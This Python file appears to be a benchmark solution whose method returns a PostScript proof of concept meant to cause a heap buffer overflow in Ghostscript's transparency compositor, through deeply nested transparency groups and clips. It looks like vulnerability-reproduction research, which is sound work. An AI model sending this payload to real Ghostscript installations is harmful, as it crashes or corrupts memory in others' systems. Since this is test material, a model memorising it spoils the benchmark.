import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow vulnerability in Ghostscript.
        
        The vulnerability (oss-fuzz:42537171) is located in the PDF 1.4 transparency compositor.
        It occurs because the code fails to check the nesting depth of the layer/clip stack 
        before pushing a clip mark. By repeatedly nesting transparency groups and applying 
        clips, we can force the stack to grow beyond its allocated bounds on the heap, 
        triggering the overflow.
        
        We use a PostScript loop to efficiently generate the deep nesting structure 
        without creating a large file (optimizing for the score based on PoC length).
        """
        
        # PostScript payload construction:
        # 1. %!PS: Standard header
        # 2. setpagedevice with /Transparency true: Activates the PDF 1.4 transparency compositor (gdevp14)
        # 3. Loop 100,000 times:
        #    - pop: Clean up the loop index from the operand stack
        #    - .begintransparencygroup: Pushes a new transparency group (layer) onto the p14 stack
        #    - rectclip: Applies a clip, which pushes a clip mark onto the p14 stack. 
        #      The vulnerability is triggered here when the stack is full but unchecked.
        
        poc = (
            b"%!PS\n"
            b"<< /PageSize [100 100] /Transparency true >> setpagedevice\n"
            b"0 1 100000 {\n"
            b"  pop\n"
            b"  << /Subtype /Group /Isolated true >> .begintransparencygroup\n"
            b"  0 0 10 10 rectclip\n"
            b"} for\n"
        )
        
        return poc